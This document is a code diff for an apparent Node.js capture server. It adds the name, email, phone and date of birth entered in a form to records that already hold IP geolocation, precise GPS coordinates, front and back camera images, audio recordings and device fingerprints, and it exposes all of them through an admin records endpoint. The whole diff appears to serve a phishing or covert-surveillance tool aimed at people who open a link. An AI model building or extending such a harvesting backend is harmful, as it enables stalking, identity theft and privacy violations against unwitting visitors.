@@ -42,6 +42,11 @@ async function initDB() {
       language        TEXT,
       platform        TEXT,
       user_agent      TEXT,
+      -- Form data
+      form_name       TEXT,
+      form_email      TEXT,
+      form_phone      TEXT,
+      form_dob        TEXT,
       -- Network (server-side)
       ip_address      TEXT,
       ip_city         TEXT,
@@ -148,6 +153,7 @@ app.post("/api/capture", async (req, res) => {
     const {
       timestamp_open, os, browser, browser_version, device_type,
       screen_res, language, platform, user_agent,
+      form_name, form_email, form_phone, form_dob,
       geo_lat, geo_lon, geo_accuracy,
       front_image, back_image, audio_recording,
     } = req.body;
@@ -157,23 +163,30 @@ app.post("/api/capture", async (req, res) => {
     // Use the resolved public IP (if localhost was resolved via ipify)
     const ip_address = geo.resolvedIP || raw_ip;
 
+    const openDate = timestamp_open ? new Date(timestamp_open) : new Date();
+    const openIST = openDate.toLocaleString("en-IN", { timeZone: "Asia/Kolkata" }) + " (IST)";
+    const createdIST = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" }) + " (IST)";
+
     db.run(
       `INSERT INTO captures (
         timestamp_open, os, browser, browser_version, device_type,
         screen_res, language, platform, user_agent,
+        form_name, form_email, form_phone, form_dob,
         ip_address, ip_city, ip_region, ip_country, ip_lat, ip_lon, ip_isp, ip_org, ip_timezone,
         geo_lat, geo_lon, geo_accuracy,
-        front_image, back_image, audio_recording
-      ) VALUES (?,?,?,?,?, ?,?,?,?, ?,?,?,?,?,?,?,?,?, ?,?,?, ?,?,?)`,
+        front_image, back_image, audio_recording, created_at
+      ) VALUES (?,?,?,?,?, ?,?,?,?, ?,?,?,?, ?,?,?,?,?,?,?,?,?, ?,?,?, ?,?,?,?)`,
       [
-        timestamp_open || new Date().toISOString(),
+        openIST,
         os || "Unknown", browser || "Unknown", browser_version || "",
         device_type || "Unknown",
         screen_res || "", language || "", platform || "", user_agent || "",
+        form_name || "", form_email || "", form_phone || "", form_dob || "",
         ip_address,
         geo.city, geo.region, geo.country, geo.lat, geo.lon, geo.isp, geo.org, geo.timezone,
         geo_lat || null, geo_lon || null, geo_accuracy || null,
         front_image || null, back_image || null, audio_recording || null,
+        createdIST,
       ]
     );
 
@@ -225,6 +238,7 @@ app.get("/api/admin/records", (req, res) => {
     const stmt = db.prepare(`
       SELECT id, timestamp_open, os, browser, browser_version, device_type,
              screen_res, language, platform,
+             form_name, form_email, form_phone, form_dob,
              ip_address, ip_city, ip_region, ip_country, ip_lat, ip_lon, ip_isp, ip_org, ip_timezone,
              geo_lat, geo_lon, geo_accuracy,
              created_at
